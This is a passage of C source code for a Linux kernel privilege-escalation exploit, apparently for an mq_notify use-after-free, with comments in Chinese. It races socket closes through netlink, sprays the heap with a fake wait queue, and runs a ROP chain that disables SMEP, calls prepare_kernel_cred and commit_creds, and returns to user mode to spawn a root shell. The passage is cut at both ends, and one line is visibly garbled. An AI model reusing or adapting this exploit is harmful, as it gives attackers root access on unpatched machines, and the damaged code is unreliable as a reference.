            "popq %2\n"
            :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
            :
            : "memory"
        );
    }
    int add_rmem_alloc(void){
        int fd1 = -1;
        int fd2 = -1;
        fd1 = socket(AF_NETLINK,SOCK_RAW,2);
        fd2 = socket(AF_NETLINK,SOCK_DGRAM,2);
        struct sockaddr_nl nladdr;
        nladdr.nl_family = AF_NETLINK;
        nladdr.nl_groups = 0;
        nladdr.nl_pad = 0;
        nladdr.nl_pid = 10;
        bind(fd1,(struct sockaddr*)&nladdr,sizeof(struct sockaddr_nl));
        struct msghdr msg;
        struct sockaddr_nl r_nladdr;
        r_nladdr.nl_pad = 0;
        r_nladdr.nl_pid = 10;
        r_nladdr.nl_family = AF_NETLINK;
        r_nladdr.nl_groups = 0;
        memset(&msg,0,sizeof(msg));
        msg.msg_name = &r_nladdr; /*address of receiver*/
        msg.msg_namelen = sizeof(nladdr);
        /* message head */
        char buffer[] = "An example message";
        struct nlmsghdr *nlhdr;
        nlhdr = (struct nlmsghdr*)malloc(NLMSG_SPACE(MAX_MSGSIZE));
        strcpy(NLMSG_DATA(nlhdr),buffer);
        nlhdr->nlmsg_len = NLMSG_LENGTH(strlen(buffer));/*nlmsghdr len + data len*/
        nlhdr->nlmsg_pid = getpid();  /* self pid */
        nlhdr->nlmsg_flags = 0;
        struct iovec iov;
        iov.iov_base = nlhdr;
        iov.iov_len = nlhdr->nlmsg_len;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        while (sendmsg(fd2, &msg, MSG_DONTWAIT)>0) ;
        if (errno != EAGAIN)
        {
            perror("sendmsg");
            exit(-5);
        }
        printf("[*] sk_rmem_alloc > sk_rcvbuf ==> ok\n");
        return fd1;
        return 0;    
    }
    static void *thread2(struct state *s){
        int fd = s->fd;
        s->ok = 1;
        sleep(3);
        close(s->close_fd);
        int optval = 1;
        if(setsockopt(fd,SOL_NETLINK,NETLINK_NO_ENOBUFS,&optval,4)){
            perror("setsockopt ");
        }
        else{
            puts("[*] wake up thread 1");
        }
    }
    void tiger(int fd){
        pthread_t pid;
        struct state s;
        s.ok = 0;
        s.fd = fd;
        s.close_fd = dup(fd);
        if(errno = pthread_create(&pid,NULL,thread2,&s)){
            perror("pthread_create ");
            exit(-1);
        }  
        while(!(s.ok));
        puts("[*] mq_notify start");
        struct sigevent sigv;
        sigv.sigev_signo = s.close_fd;
        sigv.sigev_notify = SIGEV_THREAD;
        sigv.sigev_value.sival_ptr = "test";
        _mq_notify((mqd_t)0x666,&sigv);
        puts("ok");
    }
    struct thread3_arg
    {
        int send ;
        int fd;
        struct msghdr *msg;
        int flag;
    };
    static void *thread3(struct thread3_arg *arg){
        sendmsg(arg->fd,arg->msg,0);
    }
    void heap_spray(int nlk_fd){
        int sfd = -1;
        int rfd = -1;
        sfd = socket(AF_UNIX,SOCK_DGRAM,0);
        rfd = socket(AF_UNIX,SOCK_DGRAM,0);
        if (rfdcmsg_len = 1024;
        pbuf->cmsg_level = 0;
        pbuf->cmsg_type = 1;
        *(unsigned int*)((char*)buf+0x2b0) = 0x12345678;/*portid*/
        *(unsigned long*)((char*)buf+0x2c8) = 0;       /*groups*/
        struct u_wait_queue uwq;   /*在用户空间伪造的u_wait_queue_t*/
        memset(&uwq,0x66,sizeof(uwq));
        uwq.flag = 0x01;
        //uwq.func = 0xdeadbeefdeadbeef;
        uwq.func = 0xffffffff81000085; /* swapgs ; ret; addr*/
        uwq.next = &(uwq.next);
        uwq.prev = &(uwq.next);
        printf("buf : %p\nuwq : %p\n",buf,&(uwq.next));
        *(unsigned long*)((char*)buf+0x2e8) = (void*)(&(uwq.next));/*覆盖netlink_sock->wait->tasklist.next,为用户空间fake uwq的next地址*/
        //*(unsigned long*)((char*)buf+0x2f0) = (void*)0x4444444444444444;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        //msg.msg_controllen = 0;
        /*下面是伪造栈,通过xchg，迁移过来*/
        size_t *p = ((unsigned int)&uwq)&0xffffffff;
        size_t *ptmp = p-0x20;
        mmap(ptmp, 0x200, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        /*
        0xffffffff8100abde : pop rax ; ret
        0xffffffff811b265d : pop rdi ; ret
        0xffffffff8105c144 : pop rbx ; ret
        0xffffffff813b3eba : mov rdi, rax ; call rbx
        commit_creds = 0xffffffff810a1720 ;
        prepare_kernel_cred = 0xffffffff810a1a60;
        */
        int r = 0;
        p[r++] = 0xffffffff811b265d ;// pop rdi ; ret
        p[r++] = 0x6f0;
        p[r++] = 0xffffffff810031bd ;// mov cr4, rdi ; pop rbp ; ret
        p[r++] = (unsigned long)p+0x100;
        p[r++] = 0xffffffff8100abde;
        p[r++] = 0;
        p[r++] = 0xffffffff811b265d;
        p[r++] = 0;
        p[r++] = 0xffffffff810a1a60; //prepare_kernel_cred
        p[r++] = 0xffffffff8133ff34 ;// mov rdi, rax ; mov rax, rdi ; pop rbx ; pop rbp ; ret
        p[r++] = 0;
        p[r++] = (unsigned long)p+0x100;
        p[r++] = 0xffffffff810a1720;
        p[r++] = 0xffffffff81063d54 ;// swapgs ; pop rbp ; ret
        p[r++] = p+0x100;
        p[r++] = 0xffffffff811b265d;
        p[r++] = getshell;
        p[r++] = 0xffffffff818410c7 ; // iretd ; call rdi
        p[r++] = (unsigned long)getshell;
        p[r++] = user_cs;
        p[r++] = user_eflags;
        p[r++] = (unsigned long)p;
        p[r++] = user_ss;
        p[r++] = 0xdeadbeefdeadbeef;
        p[r++] = 0xdeadbeefdeadbeef;
        p[r++] = 0xdeadbeefdeadbeef;
        p[r++] = 0xdeadbeefdeadbeef;
        struct timeval tv;
        memset(&tv,0,sizeof(tv));
        tv.tv_sec = 0;
        tv.tv_usec = 0;
        if(setsockopt(rfd,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv))){
            perror("heap spary setsockopt");
            exit(-1);
        }
        puts("set timeo ==> ok");
        while(sendmsg(sfd,&msg,MSG_DONTWAIT)>0);
        if (errno != EAGAIN)
        { 
            perror("[-] sendmsg");
            exit(-1);
        }
        puts("sk_wmem_alloc > sk_snfbuf");
        puts("[*] ==> sendmsg");
        msg.msg_control = buf;
        msg.msg_controllen = 1024;
        struct thread3_arg t3;
        t3.fd = sfd;
        t3.send = 0;
        t3.flag = 0;
        t3.msg = &msg;
        int i = 0;
        pthread_t pid;
        //sendmsg(sfd,&msg,0);
        for(i=0;i  